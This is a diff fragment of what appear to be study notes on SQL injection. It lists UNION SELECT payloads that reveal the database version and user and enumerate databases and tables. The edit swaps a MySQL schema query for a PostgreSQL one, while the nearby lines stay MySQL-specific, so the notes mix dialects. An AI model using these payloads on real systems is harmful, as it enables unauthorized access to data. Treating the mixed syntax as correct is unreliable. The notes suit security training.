@@ -46,7 +46,7 @@ We can use `ORDER BY` and `UNION SELECT` in a search field to visualize and enum
 ' UNION SELECT null, database(), user(), @@version, null -- //
 '
 # Now we can query all databases available for us to enumerate (note: information_schema is default)
-' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata -- //
+' UNION SELECT null, datname, null, null, null FROM pg_database -- //
 '
 # We can now query tables for our desired databases
 ' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema=database() -- //
